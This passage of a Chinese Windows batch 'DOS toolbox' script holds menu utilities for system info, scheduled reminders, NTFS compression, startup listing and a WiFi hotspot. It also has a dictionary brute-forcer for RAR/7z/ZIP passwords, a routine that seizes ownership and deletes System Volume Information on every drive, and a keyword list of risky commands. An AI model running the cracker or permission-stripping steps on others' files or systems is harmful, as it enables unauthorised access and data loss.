for /f "tokens=2 delims==" %%a in ('wmic sounddev get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =声卡:<nul
			echo;		!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims=]" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get caption /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =网卡:<nul
			echo;		!var:~1,-1!
		) else (
			echo;		!var:~1,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get CurrentBandwidth /value 2>nul"') do (
	set /a "cs+=1"
	set netspeed=
	set "netspeed=%%a"
	set "netspeed=!netspeed:~0,-1!"
	set /a "netspeed/=1000000"
	if "!cs!" equ "1" (
		set /p =网络连接速度:<nul
		echo;	!netspeed! Mbps
		echo;
	) else (
		echo;		!netspeed! Mbps
		echo;
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get defaultipgateway /value') do (
	set mrwg=
	set "mrwg=%%a"
	set "mrwg=!mrwg:{=!"
	set "mrwg=!mrwg:}=!"
	set "mrwg=!mrwg:"=!"
	set "mrwg=!mrwg:~0,-1!"
	for %%a in (!mrwg!) do (
		set /a "cs+=1"
		if "!cs!" equ "1" (
			set /p =网关地址:<nul
			echo;	%%a
		) else (
			echo;		%%a
		)
	)
)
echo;
if exist %systemroot%\system32\curl.exe (
	ping /n 1 www.baidu.com>nul
	if "!errorlevel!" equ "0" (
		for /f "delims=" %%a in ('curl -s 4.ipw.cn') do (
			set /p =外部IP地址:<nul
			echo;	%%a
			echo;
		)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get ipaddress /value') do (
	set ipdz=
	set "ipdz=%%a"
	set "ipdz=!ipdz:{=!"
	set "ipdz=!ipdz:}=!"
	set "ipdz=!ipdz:"=!"
	set "ipdz=!ipdz:~0,-1!"
	for %%a in (!ipdz!) do (
		set /a "cs+=1"
		if "!cs!" equ "1" (
			set /p =IP地址:<nul
			echo;		%%a
		) else (
			echo;		%%a
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get macaddress /value') do (
	set /a "cs+=1"
	set maxdz=
	set "macdz=%%a"
	set "macdz=!macdz:{=!"
	set "macdz=!macdz:}=!"
	set "macdz=!macdz:"=!"
	set "macdz=!macdz:~0,-1!"
	if "!cs!" equ "1" (
		if defined macdz (
			set /p =网卡MAC地址:<nul
			echo;	!macdz!
		)
	) else (
		if defined macdz (echo;		!macdz!)
	)
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('"wmic memorychip get capacity /value 2>nul"') do (
	set /a "cs+=1"
	set dw=0
	if "!cs!" equ "1" (
		set /p =内存容量:<nul
		call :xdwjs %%a b dw
		echo;	!dw!
	) else (
		call :xdwjs %%a b dw
		if "!dw!" neq "0" (echo;		!dw!)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"wmic memorychip get speed /value 2>nul"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =内存频率:<nul
			echo;	!var:~0,-1! MHz
		) else (
			echo;		!var:~0,-1! MHz
		)
	)
)
systeminfo|find /i "内存"
!hx!
mode
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:31
setlocal
title 读心术!system!
cls
echo;想一个大于0且小于128的数(不包括128)
!hx!
pause
cls
:d0c
for /l %%a in (1,2,127) do set/p=%%a   <nul
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[1\7]
if "%errorlevel%" equ "1" set /a num=1
if "%errorlevel%" equ "2" set /a num=0
set a=2
set b=3
cls
:d1c
for /l %%a in (%a%,1,%b%) do (set/p=%%a   <nul
set/a a=a+2
set/a b=b+2)
if %b% lss 128 goto d1c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[2\7]
if "%errorlevel%" equ "1" set /a num=num+2
if "%errorlevel%" equ "2" set /a num=num
set c=4
set d=7
cls
:d2c
for /l %%a in (%c%,1,%d%) do (set/p=%%a   <nul
set/a c=c+2
set/a d=d+2)
if %d% lss 128 goto d2c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[3\7]
if "%errorlevel%" equ "1" set /a num=num+4
if "%errorlevel%" equ "2" set /a num=num
set e=8
set f=15
cls
:d3c
for /l %%a in (%e%,1,%f%) do (set/p=%%a   <nul
set/a e=e+2
set/a f=f+2)
if %f% lss 128 goto d3c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[4\7]
if "%errorlevel%" equ "1" set /a num=num+8
if "%errorlevel%" equ "2" set /a num=num
set g=16
set h=31
cls
:d4c
for /l %%a in (%g%,1,%h%) do (set/p=%%a   <nul
set/a g=g+2
set/a h=h+2)
if %g% lss 128 goto d4c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[5\7]
if "%errorlevel%" equ "1" set /a num=num+16
if "%errorlevel%" equ "2" set /a num=num
set i=32
set j=63
cls
:d5c
for /l %%a in (%i%,1,%j%) do (set/p=%%a   <nul
set/a i=i+2
set/a j=j+2)
if %j% lss 128 goto d5c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[6\7]
if "%errorlevel%" equ "1" set /a num=num+32
if "%errorlevel%" equ "2" set /a num=num
set k=64
set l=127
cls
:d6c
for /l %%a in (%k%,1,%l%) do (set/p=%%a   <nul
set/a k=k+2
set/a l=l+2)
if %l% lss 128 goto d6c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[7\7]
if "%errorlevel%" equ "1" set /a num=num+64
if "%errorlevel%" equ "2" set /a num=num
cls
echo;经过电脑复杂的计算后,得出你大脑里想的那个数是:!cswz!41;92m %num% !cswz!!ysbak!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:32
setlocal
title DOS闹钟!system!
cls
!hx!
echo;[1]定时提醒指定内容
echo;[2]定时运行指定文件
echo;[3]显示已有的计划任务
echo;[4]删除计划任务
echo;[0]返回菜单
!hx!
set nzxx=
set /p "nzxx=请输入你的选择:"
if "!nzxx!" equ "1" goto 32(1)
if "!nzxx!" equ "2" goto 32(2)
if "!nzxx!" equ "3" goto 32(3)
if "!nzxx!" equ "4" goto 32(4)
if "!nzxx!" equ "0" endlocal&goto memuv2
echo;请输入正确的选项！
call :out 2
endlocal
goto 32
:32(1)
title 定时提醒指定内容!system!
cls
set txnrmc=
set/p txnrmc=请指定任务名称:
!hx!
set txnr=
set/p txnr=请输入你需要提醒的内容:
!hx!
set txnrrq=
set/p txnrrq=请设置提醒日期(格式: yyyy/mm/dd 例如2015/08/05):
!hx!
set txnrsj=
set/p txnrsj=请设置提醒时间(格式: hh:mm:ss 例如09:3:5):
cls
md %temp%\DOS工具箱临时目录>nul 2>nul
echo;该文件夹是DOS工具箱的临时文件夹,删除后将无法提醒已有的内容！>%temp%\DOS工具箱临时目录\说明.txt
echo;@echo off>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;title %txnrmc%>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;color f1>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;echo;>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;cls>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;echo;提醒内容:"%txnr%">>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;!hx!>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;echo;该文件由DOS工具箱 - 定时提醒指定内容功能生成>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;echo;生成时间:%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;!hx!>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo;echo;按任意键退出^&pause^>nul>>"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
schtasks /create /tn "%txnrmc%" /tr "%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat" /st %txnrsj% /sd %txnrrq% /sc once&&echo;任务将在%txnrrq% %txnrsj%运行
echo;提醒文件已保存至"%temp%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 32
:32(2)
title 定时运行指定文件!system!
cls
set dsyxmc=
set/p dsyxmc=请指定任务名称:
!hx!
set dsyxlj=
set/p dsyxlj=请拖动需要定时运行的文件到此窗口:
if "%dsyxlj:~0,1%%dsyxlj:~-1%" neq """" for /f "delims=" %%a in ('"echo;%dsyxlj%"') do (set %dsyxlj%="%%~a")
!hx!
set dsyxrq=
set/p dsyxrq=请设置提醒日期(格式: yyyy/mm/dd 例如2015/08/05):
!hx!
set dsyxsj=
set/p dsyxsj=请设置提醒时间(格式: hh:mm:ss 例如09:3:5):
cls
md %temp%\DOS工具箱临时目录>nul 2>nul
echo;该文件夹是DOS工具箱的临时文件夹,删除后将无法提醒已有的内容！>%temp%\DOS工具箱临时目录\说明.txt
echo;"%dsyxlj%">"%temp%\DOS工具箱临时目录\%dsyxmc% - 定时运行文件.bat"
schtasks /create /tn "%dsyxmc%" /tr "%temp%\DOS工具箱临时目录\%dsyxmc% - 定时运行文件.bat" /st %dsyxsj% /sd %dsyxrq% /sc once&&echo;任务将在%dsyxrq% %dsyxsj%运行
echo;启动文件已保存至"%temp%\DOS工具箱临时目录\%dsyxmc% - 定时运行文件.bat"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 32
:32(3)
title 显示已有的计划任务!system!
cls
schtasks /query
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 32
:32(4)
title 删除计划任务!system!
cls
schtasks /query
!hx!
set rwsc=
set/p rwsc=请输入要删除的任务名称:
cls
schtasks /delete /tn "%rwsc%" /f
del/f/q "%temp%\DOS工具箱临时目录\%rwsc% - 定时提醒文件.bat"2>nul
del/f/q "%temp%\DOS工具箱临时目录\%rwsc% - 定时运行文件.bat"2>nul
dir/a/s %temp%\DOS工具箱临时目录\*.bat>nul 2>nul||rd/s/q %temp%\DOS工具箱临时目录
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 32
:33
setlocal
title 计时器!system!
cls
echo;计时器精确度0.01秒
!hx!
echo;按任意键开始计时(不建议跨天计时)&pause>nul
set "kssjbk=!time!"
cls
echo;计时器已开始计时,按任意键停止计时.&pause>nul
set "jssjbk=!time!"
call :sjc "!kssjbk!" "!jssjbk!" jg format
cls
echo;计时开始时间: !kssjbk!
echo;计时结束时间: !jssjbk!
echo;用时: !jg!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:34
setlocal
title 随机密码生成器!system!
cls
set mmws=
set mmxz=
set mmjg=
set mmjs=aA0bB1cC2dD3eE4fF5gG6hH7iI8jJ9kK0lL1mM2nN3oO4pP5qQ6rR7sS8tT9uU0vV1wW2xX3yY4zZ5
set /p "mmws=请输入生成的密码位数: "
cls
for /l %%a in (1,1,!mmws!) do (
	set /a "mmxz=!random!%%63"
	for %%a in (!mmxz!) do (set "mmjg=!mmjg!!mmjs:~%%a,1!")
)
echo;已生成的随机密码:
echo;!mmjg!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:35
setlocal
title 删除每个盘符下的System Volume Information文件夹!system!
cls
echo;按任意键开始删除System Volume Information文件夹&pause>nul
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%a in (!sypf!) do (
	attrib -s -h -r "%%aSystem Volume Information" 2>nul
	takeown/f "%%aSystem Volume Information" 2>nul
	echo;y|cacls "%%aSystem Volume Information" /t /c /p everyone:f 2>nul
	rd /s /q "%%aSystem Volume Information"2>nul
)
!hx!
echo;删除完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:36
setlocal
title 二进制转换器!system!
set shijinzhi=
set erjinzhi=
set shilioujinzhi=
set bajinzhi=
cls
echo;最大支持2147483647的十进制转换
set "cho=120"
!hx!
echo;[1]输入十进制转换
echo;[2]输入二进制转换
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 10z)
if "!shuru!" equ "2" (goto 2z)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选择!<nul
call :out 2
endlocal
goto 36
:10z
cls
set shijinzhi=
set /p "shijinzhi=请输入十进制整数: "
call :checkvar shijinzhi num jg
if "!jg!" equ "0" (goto 10z)
call :10to2 !shijinzhi! erjinzhi
call :10to8 !shijinzhi! bajinzhi
call :10to16 !shijinzhi! shilioujinzhi
cls
echo;十进制: !shijinzhi!
echo;二进制: !erjinzhi!
echo;八进制: !bajinzhi!
echo;十六进制: !shilioujinzhi!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 36
:2z
cls
set srejz=
set /p "srejz=请输入二进制整数: "
if not defined srejz (goto 2z)
for /f "delims=01" %%a in ("!srejz!") do (goto 2z)
call :2to10 !srejz! sjz
call :10to8 !sjz! bajinzhi
call :10to16 !sjz! shilioujinzhi
cls
echo;十进制: !sjz!
echo;二进制: !srejz!
echo;八进制: !bajinzhi!
echo;十六进制: !shilioujinzhi!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 36
:77
setlocal
title vbs计算器!system!
set vbsbds=
set vbsjieguo=
cls
set /p "vbsbds=请输入表达式(e=返回菜单): "
if not defined vbsbds (endlocal&goto 77)
if /i "!vbsbds!" equ "e" (endlocal&goto memuv2)
echo;msgbox !vbsbds!,"65","VBS计算器">"%temp%\temp.vbs"
"%temp%\temp.vbs"
del /f /q "%temp%\temp.vbs"
endlocal
goto 77
:guanyu
setlocal
title 关于DOS工具箱!system!
for /f "delims=" %%a in ("%0") do (
	if "%%~za" equ "!versize!" (
		set "daxiao1=%%~za字节"
	) else (
		set "daxiao1=%%~za字节  (文件大小异常,可能已被修改)"
	)
)
if /i "!processor_architecture!" equ "x86" (set bit=32) else (set bit=64)
call :sjc "!dosqssj!" "!time!" jg format
cls
echo;关于DOS工具箱
!hx!
echo;版本: 		1.9.5 (!ver!.!versize!)
echo;操作系统: 	!system:~3! !bit!位
echo;版权所有 	2012-2025 Administrator 保留所有权利
!hx!
echo;本次已运行:		!jg!
echo;DOS工具箱所在路径:	!weizhi!
echo;文件大小:		!daxiao1!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:37
setlocal
title 文本浏览!system!
cls
!hx!
echo;要显示多个文件,就用空格隔开路径,显示文件以后:
echo;F=显示下个文件,Q=退出,等号显示行数,空格显示下一页,回车显示下一行
!hx!
set wenben=
set /p "wenben=拖动需要显示的文件到此窗口: "
call :ljjc wenben
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	endlocal
	goto 37
)
!hx!
more /e /p "!wenben1"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:38
title 显示计算机与用户的设置!system!
cls
!hx!
gpresult /z
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:39
setlocal
title NTFS压缩!system!
set "cho=12340"
cls
echo;此功能只能用于NTFS分区,要压缩或者解压多个文件,就用空格隔开路径.
!hx!
echo;[1]NTFS压缩
echo;[2]NTFS解压
echo;[3]NTFS压缩文件夹
echo;[4]NTFS解压文件夹
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto yasuo)
if "!shuru!" equ "2" (goto jieya)
if "!shuru!" equ "3" (goto yasuowjj)
if "!shuru!" equ "4" (goto jieyawjj)
if "!shuru!" equ "5" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选择！<nul
call :out 2
endlocal
goto 39
:jieya
title NTFS解压!system!
cls
set jieya=
set /p "jieya=拖动需要解压的文件到此窗口: "
call :ljjc jieya
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	goto jieya
)
!hx!
compact /u /a /i /f "!jieya!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 39
:yasuo
title NTFS压缩!system!
cls
set yasuo=
set /p "yasuo=拖动需要压缩的文件到此窗口: "
call :ljjc yasuo
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	goto yasuo
)
!hx!
compact /c /a /i /f "!yasuo!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 39
:jieyawjj
title NTFS解压文件夹!system!
cls
set jieya=
set /p "jieya=拖动需要解压的文件夹到此窗口: "
call :ljjc jieya dir
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	goto jieyawjj
)
!hx!
compact /u /a /i /f /s:"!jieya!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 39
:yasuowjj
title NTFS压缩文件夹!system!
cls
set jieya=
set /p "jieya=拖动需要压缩的文件夹到此窗口: "
call :ljjc jieya dir
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	goto yasuowjj
)
!hx!
compact /c /a /i /f /s:"!jieya!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 39
:40
setlocal
title 获取文件所有权限!system!
cls
echo;此功能只能用于NTFS分区
!hx!
set ntfswjqx=
set /p "ntfswjqx=拖动需要获取所有权限的文件或者文件夹到此窗口: "
if not defined ntfswjqx (endlocal&goto 40)
call :lj ntfswjqx ntfswjqx
if exist "!ntfswjqx!" (
	set /p =路径不存在<nul
	call :out 2
	endlocal
	goto 40
)
!hx!
attrib -s -h -r "!ntfswjqx!" 2>nul
takeown /f "!ntfswjqx!" 2>nul
echo;y|cacls "!ntfswjqx!" /t /c /g %username%:f 2>nul
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:41
title 显示开机启动项!system!
cls
!hx!
if /i "!system:~11,1!" equ "x" (
	dir /a /s /b "%systemdrive%\Documents and Settings\%username%\「开始」菜单\程序\启动" 2>nul
	dir /a /s /b "%systemdrive%\Documents and Settings\all users\「开始」菜单\程序\启动" 2>nul
) else (
	dir /a /s /b "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
	dir /a /s /b "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 2>nul
) 
echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows\load 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v taskman 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:kcd
start mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
goto memuv2
:gcd
start mshta "javascript:with (new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0)){Eject();Eject();}window.close();"
goto memuv2
:42
setlocal
title 语音阅读器!system!
cls
set ydnr=
set /p "ydnr=请输入要阅读的内容: "
start mshta vbscript:createobject("sapi.spvoice").speak("!ydnr!")(window.close)
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:43
setlocal
title 批处理文件风险分析!system!
set dx=0
cls
set batfx=
set /p "batfx=拖动要分析的文件到此窗口: "
call :ljjc batfx
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	endlocal
	goto 43
)
!hx!
find /n /i "del" "!batfx!"&&set /a "dx+=1"
find /n /i "rd" "!batfx!"&&set /a "dx+=1"
find /n /i "arp" "!batfx!"&&set /a "dx+=1"
find /n /i "assoc" "!batfx!"&&set /a "dx+=1"
find /n /i "attrib" "!batfx!"&&set /a "dx+=1"
find /n /i "cacls" "!batfx!"&&set /a "dx+=1"
find /n /i "format" "!batfx!"&&set /a "dx+=1"
find /n /i "ftype" "!batfx!"&&set /a "dx+=1"
find /n /i "taskkill" "!batfx!"&&set /a "dx+=1"
find /n /i "taskl" "!batfx!"&&set /a "dx+=1"
find /n /i "reg" "!batfx!"&&set /a "dx+=1"
find /n /i "ren" "!batfx!"&&set /a "dx+=1"
find /n /i "regsvr32" "!batfx!"&&set /a "dx+=1"
find /n /i "rd" "!batfx!"&&set /a "dx+=1"
find /n /i "schtask" "!batfx!"&&set /a "dx+=1"
find /n /i "shutdown" "!batfx!"&&set /a "dx+=1"
!hx!
echo;批处理文件: !batfx!
echo;危险等级: !dx!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:44
setlocal
title 文件搜索!system!
cls
set sswjm=
set /p "sswjm=输入你要搜索的文件名(默认在%systemdrive%\中搜索): "
!hx!
dir /a /s !sswjm!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:45
setlocal
title 修复已损坏的文件!system!
cls
set xfwj=
set /p "xfwj=拖动要修复的文件到此窗口: "
call :ljjc xfwj
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	endlocal
	goto 45
)
!hx!
recover "!xfwj!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:46
setlocal
title 暴力破解压缩包密码!system!
cls
set rarazlj=
for /f "skip=2 tokens=3 delims= " %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /v path') do (
	set "rarazlj=%%a"
	set "rarpd=!rarazlj!\Rar.exe"
	set "rarpd7z=!rarazlj!\winrar.exe"
)
cls
if not exist "!rarpd!" (
	echo;没有安装WinRAR.
	echo;搜索7-Zip...
	set 7zlj=
	for /f "skip=2 tokens=3 delims= " %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip" /v path') do (
		set "7zlj=%%a"
		set "7zlj=!7zlj!7z.exe"
		set "rarpd=!7zlj!"
		set "rarpd7z=!7zlj!"
	)
)
if not exist "!rarpd!" (
	echo;没有找到7-Zip
	!hx!
	set /p =按任意键返回菜单<nul&pause>nul
	endlocal
	goto memuv2
)
set yswjlj=
set /p "yswjlj=拖动要破解的压缩包到此窗口(e=返回菜单): "
if /i "!yswjlj!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc yswjlj
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	endlocal
	goto 46
)
for /f "delims=" %%a in ("!yswjlj!") do (
	if /i "%%~xa" equ ".rar" (
		set "ysbkzm=.rar"
		goto rarwjok
	)
	if /i "%%~xa" equ ".7z" (
		set "ysbkzm=.7z"
		goto rarwjok
	)
	if /i "%%~xa" equ ".zip" (
		set "ysbkzm=.zip"
		goto rarwjok
	)
	echo;无效的文件格式！
	call :out 2
	endlocal
	goto 46
)
:rarwjok
set pjzd=
set /p "pjzd=拖动字典文件到此窗口(e=返回菜单): "
if /i "!pjzd!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc pjzd
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	goto rarwjok
)
for /f "delims=" %%a in ("!pjzd!") do (
	if /i "%%~xa" equ ".txt" (
		if /i "!ysbkzm!" equ ".rar" (goto kspj)
		if /i "!ysbkzm!" equ ".7z" (goto kspj1)
		if /i "!ysbkzm!" equ ".zip" (goto kspj1)
	)
	echo;不是txt文件！
	call :out 2
	goto rarwjok
)
:kspj
!hx!
for /f "usebackq delims=" %%a in ("!pjzd!") do (
	cls
	echo;正在破解的压缩包: "!yswjlj!"
	echo;
	echo;正在使用的字典文件: "!pjzd!"
	echo;
	set "pjmm=%%a"
	echo;正在尝试密码:%%a
	"!rarpd!" t -y -inul -p%%a "!yswjlj!"
	if "!errorlevel!" equ "0" (goto pjcg)
)
:pjsb
!hx!
echo;破解失败！
echo;
echo;字典里没有正确的密码
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:pjcg
!hx!
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
echo;破解成功！
echo;
echo;压缩包: "!yswjlj!"
echo;解压密码是:!pjmm!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:kspj1
!hx!
for /f "usebackq delims=" %%a in ("!pjzd!") do (
	cls
	echo;正在破解的压缩包: "!yswjlj!"
	echo;
	echo;正在使用的字典文件: "!pjzd!"
	echo;
	set "pjmm=%%a"
	echo;正在尝试密码:%%a
	"!rarpd7z!" t -y -inul -p%%a "!yswjlj!"
	if "!errorlevel!" equ "0" (goto pjcg)
)
goto pjsb
:47
setlocal
title Wifi热点!system!
set "cho=1230"
cls
!hx!
echo;[1]开启Wifi热点
echo;[2]关闭Wifi热点
echo;[3]查看网络配置
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto kqwifi)
if "!shuru!" equ "2" (goto gbwifi)
if "!shuru!" equ "3" (goto wlpz)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 47
:kqwifi
title 开启Wifi热点!system!
cls
set wifissid=
set wifimiam=
set /p "wifissid=请输入Wifi名称(SSID): "
set /p "wifimima=请输入Wifi密码(密码位数:8到63位): "
cls
net start sharedaccess 2>nul
netsh wlan stop hostednetwork
netsh wlan set hostednetwork mode=allow ssid="!wifissid!" key=!wifimima!
netsh wlan start hostednetwork
!hx!
echo;如果无法连接请手动获取IP地址(如果开启系统防火墙也会无法连接成功)
echo;Wifi名称(SSID): !wifissid!
echo;Wifi密码: !wifimima!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 47
:gbwifi
title 关闭Wifi热点!system!
cls
netsh wlan stop hostednetwork
!hx!
set /p =按任意键返回<nul&pause>nul
